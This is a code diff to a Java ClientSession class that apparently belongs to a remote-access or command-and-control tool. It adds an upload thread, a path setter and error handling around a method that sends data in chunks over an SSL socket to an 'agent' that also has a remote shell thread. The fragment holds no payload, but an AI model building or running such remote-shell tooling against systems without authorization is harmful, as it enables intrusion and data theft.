@@ -18,7 +18,11 @@ public class ClientSession {
     private final int SESSION_ID;
 
     private String command;
+
+    private String path;
     public Thread remoteShellThread;
+
+    public Thread uploadThread;
 
     public int getSESSION_ID() {
         return SESSION_ID;
@@ -30,9 +34,18 @@ public class ClientSession {
 
 
         remoteShellThread = new Thread(this::initializeRemoteShell);
+        uploadThread = new Thread(() -> uploadData(path));
+
     }
 
-    public void uploadData(String path) throws IOException {
+    private void restoreThread() {
+        this.uploadThread = new Thread(() -> uploadData(path));
+    }
+
+    public void uploadData(String path) {
+
+        try{
+
         InputStream in = sessionSocket.getInputStream();
         OutputStream out = sessionSocket.getOutputStream();
 
@@ -90,6 +103,13 @@ public class ClientSession {
 
                 i = i + payloadMaximumSize;
             }
+
+            restoreThread();
+            Thread.currentThread().interrupt();
+
+        }catch (Exception e){
+            System.out.println(e);
+        }
 
         }catch (Exception e){
             System.out.println(e);
@@ -279,6 +299,10 @@ public class ClientSession {
 
     public void setCommand(String command) {
         this.command = command;
+    }
+
+    public void setPath(String path) {
+        this.path = path;
     }
 
     public void establishSocket (SSLSocket agentSocket){
